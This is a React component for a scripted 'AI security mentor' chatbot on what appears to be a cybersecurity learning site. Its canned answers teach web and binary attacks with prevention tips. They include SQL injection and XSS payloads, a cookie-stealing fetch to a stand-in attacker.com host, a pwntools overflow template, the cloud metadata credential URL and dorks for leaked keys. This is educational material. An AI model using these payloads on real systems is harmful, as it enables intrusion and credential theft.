import React, { useState, useRef, useEffect } from 'react';

const RESPONSES = {
  greet: {
    keywords: ['hi', 'hello', 'hey', 'namaste', 'helo', 'hii', 'sup'],
    answers: ["Hey hacker! 👋 ARIA online. What cybersecurity topic do you want to explore today?", "Hello! I'm ARIA — your AI security mentor. Ask me anything about ethical hacking!", "Hey! Ready to learn some hacking? 😎 Ask me about XSS, SQLi, buffer overflow, OSINT — anything!"],
  },
  sql: {
    keywords: ['sql', 'sqli', 'sql injection', 'database injection'],
    answers: [`## SQL Injection 🔥\n\nSQL Injection tab hoti hai jab user input directly SQL query me daal diya jaata hai bina sanitization ke.\n\n**Basic Attack:**\n\`\`\`sql\n' OR '1'='1  →  Login bypass!\n' UNION SELECT username,password FROM users--\n\`\`\`\n\n**Types:**\n- **In-band** → Error/Union based\n- **Blind** → Boolean/Time based\n\n**Tool:** SQLMap\n\`\`\`bash\nsqlmap -u "http://target.com/?id=1" --dbs\n\`\`\`\n\n**Prevention:** Always use Prepared Statements!\n\`\`\`php\n$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");\n$stmt->execute([$id]);\n\`\`\`\n\nPractice on: HackTheBox, TryHackMe 🎯`],
  },
  xss: {
    keywords: ['xss', 'cross site scripting', 'script injection'],
    answers: [`## Cross-Site Scripting (XSS) ⚡\n\nXSS me attacker malicious JavaScript inject karta hai — jo victim ke browser me execute hota hai.\n\n**Types:**\n- **Reflected XSS** → URL me script\n- **Stored XSS** → Database me save (most dangerous!)\n- **DOM XSS** → Client-side JS vulnerability\n\n**Common Payloads:**\n\`\`\`javascript\n<script>alert(document.cookie)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\`\`\`\n\n**Real Attack — Cookie Theft:**\n\`\`\`javascript\n<script>\nfetch('https://attacker.com/steal?c='+document.cookie)\n</script>\n\`\`\`\n\n**Prevention:**\n- HTML encode all output\n- Content Security Policy (CSP)\n- HttpOnly cookies\n\nPractice: xss-game.appspot.com 🎮`],
  },
  csrf: {
    keywords: ['csrf', 'cross site request', 'request forgery'],
    answers: [`## CSRF — Cross Site Request Forgery 🎭\n\nCSRF me attacker victim se unintended actions karwata hai using their authenticated session.\n\n**Attack Flow:**\n\`\`\`\n1. Victim bank.com pe logged in hai\n2. Victim evil.com visit karta hai\n3. evil.com hidden form submit karta hai automatically\n4. Bank ₹10,000 transfer process karta hai!\n\`\`\`\n\n**Prevention:**\n- CSRF tokens use karo\n- SameSite cookie attribute\n- Origin header validate karo`],
  },
  buffer: {
    keywords: ['buffer overflow', 'bof', 'buffer', 'pwn', 'binary exploitation'],
    answers: [`## Buffer Overflow 💣\n\nBuffer overflow tab hota hai jab program allocated memory se zyada data write karta hai!\n\n**Memory Layout:**\n\`\`\`\n┌─────────────────┐\n│  Return Address │ ← Yahi overwrite karte hain!\n├─────────────────┤\n│   Saved EBP     │\n├─────────────────┤\n│  buffer[64]     │ ← Overflow yahan se shuru\n└─────────────────┘\n\`\`\`\n\n**Vulnerable Code:**\n\`\`\`c\nchar buffer[64];\ngets(buffer);  // No bounds check — dangerous!\n\`\`\`\n\n**Basic Exploit:**\n\`\`\`python\nfrom pwn import *\np = process('./vuln')\npayload = b'A' * 72 + p64(win_address)\np.sendline(payload)\np.interactive()\n\`\`\`\n\nPractice: pwn.college (Free!) 🎯`],
  },
  nmap: {
    keywords: ['nmap', 'port scan', 'scanning', 'network scan'],
    answers: [`## Nmap — Network Scanner 🔌\n\n**Common Commands:**\n\`\`\`bash\n# Basic scan\nnmap 192.168.1.1\n\n# Full scan with service detection\nnmap -sC -sV -p- 192.168.1.1\n\n# Stealth scan\nnmap -sS 192.168.1.1\n\n# OS detection\nnmap -O 192.168.1.1\n\n# Entire network\nnmap -sn 192.168.1.0/24\n\`\`\`\n\n**Important Ports:**\n- 22 → SSH\n- 80/443 → HTTP/HTTPS\n- 3306 → MySQL\n- 3389 → RDP (Windows)\n- 445 → SMB (EternalBlue!)\n\n⚠️ Only scan authorized targets!`],
  },
  wireshark: {
    keywords: ['wireshark', 'pcap', 'packet analysis', 'network traffic'],
    answers: [`## Wireshark — Packet Analyzer 📡\n\n**Essential Filters:**\n\`\`\`\nhttp                     → HTTP traffic\nip.addr == 192.168.1.1   → Specific IP\ntcp.port == 80           → Port filter\nhttp.request.method==POST → POST requests\ndns                      → DNS queries\n\`\`\`\n\n**Finding Credentials:**\n\`\`\`\nFilter: http.request.method == POST\n→ Packet details me HTML Form dekho\n→ username=admin&password=secret visible!\n\`\`\`\n\n**Pro Tip:** Right click → Follow TCP Stream\n→ Poori conversation ek jagah! 🎯`],
  },
  crypto: {
    keywords: ['crypto', 'cryptography', 'cipher', 'encrypt', 'decrypt', 'rsa', 'aes', 'hash', 'caesar', 'rot13', 'base64'],
    answers: [`## Cryptography Guide 🔐\n\n**Classical Ciphers:**\n\`\`\`\nCaesar:  HELLO → KHOOR (shift 3)\nROT13:   HELLO → URYYB\nBase64:  Hello → SGVsbG8=\n\`\`\`\n\n**Modern Encryption:**\n- **AES** → Symmetric (same key encrypt/decrypt)\n- **RSA** → Asymmetric (public/private key pair)\n\n**RSA CTF Attack:**\n\`\`\`python\n# Small n → factor it on factordb.com!\n# Get p, q → compute private key → decrypt!\n\`\`\`\n\n**Hash Cracking:**\n\`\`\`bash\nhashcat -m 0 hash.txt wordlist.txt  # MD5\njohn --format=sha256 hash.txt\n\`\`\`\n\n**CTF Tools:**\n- CyberChef → gchq.github.io/CyberChef\n- CrackStation → crackstation.net 🎯`],
  },
  osint: {
    keywords: ['osint', 'open source intelligence', 'google dork', 'dorking', 'shodan', 'recon'],
    answers: [`## OSINT — Open Source Intelligence 📡\n\n**Google Dorking:**\n\`\`\`\nsite:example.com           → Specific site\nfiletype:pdf               → File type filter\nintitle:"index of"         → Directory listings\ninurl:admin                → Admin pages\n"password" filetype:txt    → Password files!\n\`\`\`\n\n**Shodan — Hacker's Google:**\n\`\`\`\nport:22 country:IN         → SSH servers in India\n"default password"         → Default credentials\nhostname:target.com        → Company devices\n\`\`\`\n\n**Username Search:**\n\`\`\`bash\npython3 sherlock.py username\n# Finds on 300+ sites!\n\`\`\`\n\n**Tools:** osintframework.com 🎯`],
  },
  forensics: {
    keywords: ['forensics', 'forensic', 'steganography', 'steg', 'hidden', 'metadata', 'binwalk', 'volatility', 'memory'],
    answers: [`## Digital Forensics 🔍\n\n**CTF First Steps:**\n\`\`\`bash\nfile suspicious.jpg        # Real file type?\nstrings suspicious.jpg     # Text inside?\nexiftool suspicious.jpg    # Metadata?\nbinwalk -e suspicious.jpg  # Hidden files?\n\`\`\`\n\n**Steganography:**\n\`\`\`bash\nsteghide extract -sf image.jpg\nzsteg image.png            # PNG LSB analysis\n\`\`\`\n\n**Memory Forensics:**\n\`\`\`bash\npython3 vol.py -f mem.raw windows.pslist\npython3 vol.py -f mem.raw windows.malfind\n\`\`\`\n\n**Online Tools:**\n- AperiSolve → aperisolve.com\n- StegOnline → stegonline.georgeom.net 🎯`],
  },
  malware: {
    keywords: ['malware', 'virus', 'trojan', 'ransomware', 'reverse engineering', 'ghidra', 'ida'],
    answers: [`## Malware Analysis 🦠\n\n**⚠️ NEVER analyze on main machine!**\nUse: VirtualBox + FlareVM/REMnux\n\n**Static Analysis:**\n\`\`\`bash\nfile malware.exe\nstrings malware.exe        # Readable strings\nmd5sum malware.exe         # Hash → VirusTotal\n\`\`\`\n\n**Dynamic Analysis Tools:**\n- Process Monitor → File/Registry changes\n- Wireshark → C2 communication\n- Fakenet-NG → Fake internet\n\n**Reverse Engineering:**\n\`\`\`\n1. Ghidra me import karo (free!)\n2. Auto-analyze karo\n3. main() function dhundho\n4. Flag/password check dhundho\n\`\`\`\n\nOnline Sandbox: any.run 🎯`],
  },
  cloud: {
    keywords: ['cloud', 'aws', 'azure', 'gcp', 's3', 'bucket', 'iam', 'ssrf', 'metadata'],
    answers: [`## Cloud Security ☁️\n\n**AWS Common Misconfigs:**\n\n**1. Public S3 Buckets:**\n\`\`\`bash\naws s3 ls s3://company-backup --no-sign-request\n# Public bucket → all files accessible!\n\`\`\`\n\n**2. SSRF to Metadata:**\n\`\`\`\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\n# Returns AWS credentials!\n\`\`\`\n\n**3. Exposed API Keys on GitHub:**\n\`\`\`\nsite:github.com "AKIA" "secret_access_key"\n\`\`\`\n\n**Practice:** flaws.cloud (Free AWS CTF!) 🎯`],
  },
  ctf: {
    keywords: ['ctf', 'capture the flag', 'challenge', 'beginner', 'tips', 'start', 'how to start'],
    answers: [`## CTF Tips & Tricks 🏆\n\n**For Beginners — Start Here:**\n1. **PicoCTF** → picoctf.org (easiest!)\n2. **TryHackMe** → tryhackme.com (guided paths)\n3. **HackTheBox** → hackthebox.com (advanced)\n\n**CTF Categories:**\n- Web → XSS, SQLi, CSRF\n- Crypto → Ciphers, RSA, hashing\n- Forensics → Steganography, PCAP\n- Pwn → Buffer overflow\n- Reversing → Ghidra, GDB\n- OSINT → Google dorking\n\n**General Tips:**\n\`\`\`\n1. strings → always run first!\n2. file → check real file type\n3. CyberChef → try magic (auto-detect)\n4. Google the challenge name\n5. Read writeups after solving\n\`\`\`\n\nAaj hi start karo! 🚀`],
  },
  tools: {
    keywords: ['tools', 'tool', 'burp', 'burpsuite', 'metasploit', 'kali', 'linux'],
    answers: [`## Essential Hacking Tools 🛠️\n\n**Web Security:**\n- **Burp Suite** → Web proxy\n- **OWASP ZAP** → Free alternative\n- **SQLMap** → Automated SQLi\n\n**Network:**\n- **Nmap** → Port scanner\n- **Wireshark** → Packet analyzer\n- **Netcat** → Swiss army knife\n\n**Exploitation:**\n- **Metasploit** → Exploit framework\n- **pwntools** → Binary exploitation\n\n**OSINT:**\n- **Shodan** → Device search\n- **Sherlock** → Username search\n\n**All-in-one:**\n\`\`\`\nKali Linux → kali.org/get-kali\nREMnux → remnux.org\n\`\`\``],
  },
  openlab: {
    keywords: ['openlabs', 'open labs', 'platform', 'about', 'aria', 'what is this'],
    answers: [`## About OpenLabs 🌐\n\nOpenLabs is India's cybersecurity learning platform — built for Indian students!\n\n**Features:**\n- 🎯 9 Security Domains\n- ⚔️ CTF Challenges with real flags\n- 📚 Theory + Hands-on learning\n- 🏆 Global Leaderboard\n- 📰 Live CTF News & Events\n- 🤖 ARIA — AI Security Mentor\n\n**Domains:**\nWeb Security, Network, Cryptography, Reverse Engineering, Forensics, OSINT, Malware Analysis, Cloud Security, Binary Exploitation\n\n**Why OpenLabs?**\n- Free for students\n- Indian curriculum aligned\n- Real CTF-style challenges\n\nStart hacking → Go to Domains! 🚀`],
  },
};

const DEFAULT_RESPONSES = [
  `Good question! 🤔\n\nMain in topics pe help kar sakta hoon:\n- **Web Security** → XSS, SQLi, CSRF\n- **Network** → Nmap, Wireshark, MITM\n- **Cryptography** → RSA, AES, ciphers\n- **Forensics** → Steganography, memory\n- **OSINT** → Google dorking, Shodan\n- **Binary Exploitation** → Buffer overflow\n- **Malware Analysis** → Static/Dynamic\n- **Cloud Security** → AWS, SSRF\n- **CTF Tips** → Strategy & resources\n\nKoi specific topic pucho — detail me bata dunga! 🎯`,
  `Interesting! Iss topic ke baare me aur specific pucho. 😊\n\nMeanwhile — OpenLabs ke **Practice** ya **Compete** section me jao aur challenges solve karo!\n\nOr pucho:\n- "How does XSS work?"\n- "Explain buffer overflow"\n- "CTF beginner tips"`,
];

function getResponse(input) {
  const lower = input.toLowerCase().trim();
  for (const [, data] of Object.entries(RESPONSES)) {
    if (data.keywords && data.keywords.some(kw => lower.includes(kw))) {
      const answers = data.answers;
      return answers[Math.floor(Math.random() * answers.length)];
    }
  }
  return DEFAULT_RESPONSES[Math.floor(Math.random() * DEFAULT_RESPONSES.length)];
}

function formatMessage(content) {
  const parts = content.split(/(```[\s\S]*?```|`[^`]+`)/g);
  return parts.map((part, i) => {
    if (part.startsWith('```') && part.endsWith('```')) {
      const inner = part.slice(3, -3);
      const lines = inner.split('\n');
      const isLang = /^[a-zA-Z]+$/.test(lines[0]?.trim() || '');
      const code = isLang ? lines.slice(1).join('\n') : inner;
      return <pre key={i} style={{ background:'#050505', border:'1px solid rgba(0,255,65,0.2)', padding:'10px 12px', overflowX:'auto', fontSize:'11px', lineHeight:1.7, margin:'8px 0', fontFamily:"'Share Tech Mono',monospace", color:'#00ff41' }}>{code.trim()}</pre>;
    }
    if (part.startsWith('`') && part.endsWith('`') && part.length > 2) {
      return <code key={i} style={{ background:'rgba(0,255,65,0.08)', color:'#00ff41', padding:'1px 6px', fontFamily:"'Share Tech Mono',monospace", fontSize:'12px', border:'1px solid rgba(0,255,65,0.2)' }}>{part.slice(1,-1)}</code>;
    }
    const boldParts = part.split(/(\*\*[^*]+\*\*)/g);
    return (
      <span key={i} style={{ whiteSpace:'pre-wrap' }}>
        {boldParts.map((bp, j) =>
          bp.startsWith('**') && bp.endsWith('**')
            ? <strong key={j} style={{ color:'#00ff41' }}>{bp.slice(2,-2)}</strong>
            : <span key={j}>{bp}</span>
        )}
      </span>
    );
  });
}

const QUICK_PROMPTS = ['How does SQL injection work?','Explain XSS attack','What is buffer overflow?','CTF beginner tips?','How to use Nmap?','What is OSINT?'];

export default function Chatbot() {
  const [open, setOpen] = useState(false);
  const [minimized, setMinimized] = useState(false);
  const [messages, setMessages] = useState([{
    role:'assistant',
    content:`ARIA ONLINE ✓\n\nHey hacker! I'm ARIA — your AI cybersecurity mentor on OpenLabs.\n\nAsk me anything about:\n• Web hacking (XSS, SQLi, CSRF)\n• Network attacks & Wireshark\n• CTF tips & walkthroughs\n• Cryptography & reverse engineering\n• Tools — Nmap, Burp Suite, Ghidra...\n\nWhat do you want to learn today? 🔐`,
  }]);
  const [input, setInput] = useState('');
  const [loading, setLoading] = useState(false);
  const messagesEndRef = useRef(null);
  const inputRef = useRef(null);

  useEffect(() => { if (open && !minimized) messagesEndRef.current?.scrollIntoView({ behavior:'smooth' }); }, [messages, open, minimized]);
  useEffect(() => { if (open && !minimized) setTimeout(() => inputRef.current?.focus(), 150); }, [open, minimized]);

  const sendMessage = () => {
    const text = input.trim();
    if (!text || loading) return;
    setMessages(prev => [...prev, { role:'user', content:text }]);
    setInput('');
    setLoading(true);
    setTimeout(() => {
      setMessages(prev => [...prev, { role:'assistant', content: getResponse(text) }]);
      setLoading(false);
    }, 500 + Math.random() * 700);
  };

  const handleKey = (e) => { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendMessage(); } };
  const clearChat = () => setMessages([{ role:'assistant', content:'Chat cleared! Fresh session. What do you want to learn? 🔐' }]);

  const btnStyle = (active) => ({
    background: 'transparent', border:'1px solid rgba(0,255,65,0.18)',
    color:'#555', cursor:'pointer', padding:'3px 8px',
    fontFamily:"'Share Tech Mono',monospace", fontSize:'10px', transition:'all 0.15s',
  });

  return (
    <>
      {/* Toggle */}
      <button onClick={() => { setOpen(o => !o); setMinimized(false); }} title="ARIA — AI Security Assistant"
        style={{ position:'fixed', bottom:'28px', right:'28px', width:'56px', height:'56px',
          background: open ? '#0a0a0a' : '#00ff41', border:'2px solid #00ff41',
          cursor:'pointer', zIndex:9998, display:'flex', alignItems:'center', justifyContent:'center',
          fontSize:'22px', boxShadow:'0 0 24px rgba(0,255,65,0.4)', transition:'all 0.25s',
          clipPath:'polygon(6px 0%,100% 0%,calc(100% - 6px) 100%,0% 100%)',
        }}>
        {open ? <span style={{ color:'#00ff41', fontFamily:"'Share Tech Mono'", fontSize:'16px' }}>✕</span> : <span>🤖</span>}
      </button>

      {/* Window */}
      {open && (
        <div style={{ position:'fixed', bottom:'96px', right:'28px', width:'370px',
          height: minimized ? '54px' : '560px', background:'#0a0a0a',
          border:'1px solid rgba(0,255,65,0.35)', zIndex:9997,
          display:'flex', flexDirection:'column', boxShadow:'0 0 40px rgba(0,255,65,0.12)',
          transition:'height 0.28s ease', overflow:'hidden',
        }}>
          <div style={{ position:'absolute', top:0, left:0, right:0, height:'2px', background:'linear-gradient(90deg,transparent,#00ff41,transparent)', pointerEvents:'none' }} />

          {/* Header */}
          <div style={{ padding:'11px 14px', borderBottom:'1px solid rgba(0,255,65,0.12)', background:'#0d0d0d', display:'flex', alignItems:'center', gap:'10px', flexShrink:0 }}>
            <div style={{ width:'8px', height:'8px', borderRadius:'50%', background:'#00ff41', boxShadow:'0 0 8px #00ff41', animation:'aria-pulse 2s ease-in-out infinite', flexShrink:0 }} />
            <div style={{ flex:1 }}>
              <div style={{ fontFamily:"'Orbitron',sans-serif", fontSize:'12px', fontWeight:900, color:'#00ff41', letterSpacing:'2px' }}>ARIA</div>
              <div style={{ fontFamily:"'Share Tech Mono',monospace", fontSize:'10px', color:'#444', letterSpacing:'1px' }}>AI SECURITY ASSISTANT • ONLINE</div>
            </div>
            <div style={{ display:'flex', gap:'6px' }}>
              {[{ label:'CLR', action:clearChat },{ label: minimized?'▲':'▼', action:()=>setMinimized(m=>!m) }].map(btn => (
                <button key={btn.label} onClick={btn.action} style={btnStyle()}
                  onMouseEnter={e => { e.currentTarget.style.color='#00ff41'; e.currentTarget.style.borderColor='#00ff41'; }}
                  onMouseLeave={e => { e.currentTarget.style.color='#555'; e.currentTarget.style.borderColor='rgba(0,255,65,0.18)'; }}
                >{btn.label}</button>
              ))}
            </div>
          </div>

          {!minimized && (<>
            {/* Messages */}
            <div style={{ flex:1, overflowY:'auto', padding:'14px', display:'flex', flexDirection:'column', gap:'10px' }}>
              {messages.map((msg, i) => (
                <div key={i} style={{ display:'flex', justifyContent: msg.role==='user'?'flex-end':'flex-start', alignItems:'flex-start', gap:'8px' }}>
                  {msg.role==='assistant' && (
                    <div style={{ width:'22px', height:'22px', flexShrink:0, background:'rgba(0,255,65,0.08)', border:'1px solid rgba(0,255,65,0.25)', display:'flex', alignItems:'center', justifyContent:'center', fontSize:'11px', marginTop:'2px' }}>🤖</div>
                  )}
                  <div style={{ maxWidth:'84%', padding:'9px 13px', background: msg.role==='user'?'rgba(0,255,65,0.08)':'#111', border:`1px solid ${msg.role==='user'?'rgba(0,255,65,0.35)':'rgba(0,255,65,0.08)'}`, fontSize:'13px', fontFamily:"'Rajdhani',sans-serif", color: msg.role==='user'?'#00ff41':'#d0d0d0', lineHeight:1.6 }}>
                    <div style={{ fontFamily:"'Share Tech Mono',monospace", fontSize:'10px', color:'rgba(0,255,65,0.4)', marginBottom:'4px', letterSpacing:'1px' }}>{msg.role==='user'?'YOU':'ARIA'}</div>
                    {formatMessage(msg.content)}
                  </div>
                </div>
              ))}
              {loading && (
                <div style={{ display:'flex', alignItems:'center', gap:'8px' }}>
                  <div style={{ width:'22px', height:'22px', background:'rgba(0,255,65,0.08)', border:'1px solid rgba(0,255,65,0.25)', display:'flex', alignItems:'center', justifyContent:'center', fontSize:'11px' }}>🤖</div>
                  <div style={{ background:'#111', border:'1px solid rgba(0,255,65,0.08)', padding:'9px 14px', display:'flex', gap:'5px', alignItems:'center' }}>
                    {[0,1,2].map(j => <div key={j} style={{ width:'5px', height:'5px', borderRadius:'50%', background:'#00ff41', animation:`aria-dot 1.2s ${j*0.2}s ease-in-out infinite` }} />)}
                    <span style={{ fontFamily:"'Share Tech Mono',monospace", fontSize:'10px', color:'#444', marginLeft:'6px', letterSpacing:'1px' }}>PROCESSING...</span>
                  </div>
                </div>
              )}
              <div ref={messagesEndRef} />
            </div>

            {/* Quick prompts */}
            {messages.length <= 1 && (
              <div style={{ padding:'8px 14px', borderTop:'1px solid rgba(0,255,65,0.06)', display:'flex', flexWrap:'wrap', gap:'5px' }}>
                {QUICK_PROMPTS.map((p, i) => (
                  <button key={i} onClick={() => { setInput(p); setTimeout(()=>inputRef.current?.focus(),50); }}
                    style={{ background:'transparent', border:'1px solid rgba(0,255,65,0.18)', color:'#666', padding:'3px 9px', fontFamily:"'Share Tech Mono',monospace", fontSize:'10px', cursor:'pointer', transition:'all 0.15s' }}
                    onMouseEnter={e => { e.currentTarget.style.color='#00ff41'; e.currentTarget.style.borderColor='#00ff41'; e.currentTarget.style.background='rgba(0,255,65,0.05)'; }}
                    onMouseLeave={e => { e.currentTarget.style.color='#666'; e.currentTarget.style.borderColor='rgba(0,255,65,0.18)'; e.currentTarget.style.background='transparent'; }}
                  >{p}</button>
                ))}
              </div>
            )}

            {/* Input */}
            <div style={{ padding:'10px 14px', borderTop:'1px solid rgba(0,255,65,0.12)', background:'#0d0d0d', flexShrink:0 }}>
              <div style={{ display:'flex', gap:'8px', alignItems:'center' }}>
                <div style={{ flex:1, position:'relative' }}>
                  <span style={{ position:'absolute', left:'10px', top:'50%', transform:'translateY(-50%)', fontFamily:"'Share Tech Mono',monospace", fontSize:'13px', color:'rgba(0,255,65,0.35)', pointerEvents:'none' }}>$</span>
                  <input ref={inputRef} value={input} onChange={e=>setInput(e.target.value)} onKeyDown={handleKey} placeholder="Ask ARIA anything..."
                    style={{ width:'100%', background:'#060606', border:'1px solid rgba(0,255,65,0.2)', color:'#e0e0e0', padding:'9px 12px 9px 26px', fontFamily:"'Rajdhani',sans-serif", fontSize:'13px', outline:'none', boxSizing:'border-box', transition:'border-color 0.2s' }}
                    onFocus={e=>e.target.style.borderColor='#00ff41'} onBlur={e=>e.target.style.borderColor='rgba(0,255,65,0.2)'}
                  />
                </div>
                <button onClick={sendMessage} disabled={loading||!input.trim()}
                  style={{ background: loading||!input.trim()?'rgba(0,255,65,0.15)':'#00ff41', border:'none', color: loading||!input.trim()?'#444':'#000', padding:'9px 16px', fontFamily:"'Orbitron',sans-serif", fontSize:'10px', fontWeight:700, cursor: loading||!input.trim()?'not-allowed':'pointer', letterSpacing:'1px', transition:'all 0.2s', flexShrink:0, clipPath:'polygon(4px 0%,100% 0%,calc(100% - 4px) 100%,0% 100%)' }}
                >{loading?'...':'SEND'}</button>
              </div>
              <div style={{ fontFamily:"'Share Tech Mono',monospace", fontSize:'10px', color:'#2a2a2a', marginTop:'5px' }}>ENTER to send · SHIFT+ENTER for newline</div>
            </div>
          </>)}
        </div>
      )}

      <style>{`
        @keyframes aria-pulse { 0%,100%{opacity:1;box-shadow:0 0 8px #00ff41} 50%{opacity:0.5;box-shadow:0 0 3px #00ff41} }
        @keyframes aria-dot { 0%,80%,100%{transform:scale(0.6);opacity:0.4} 40%{transform:scale(1);opacity:1} }
      `}</style>
    </>
  );
}
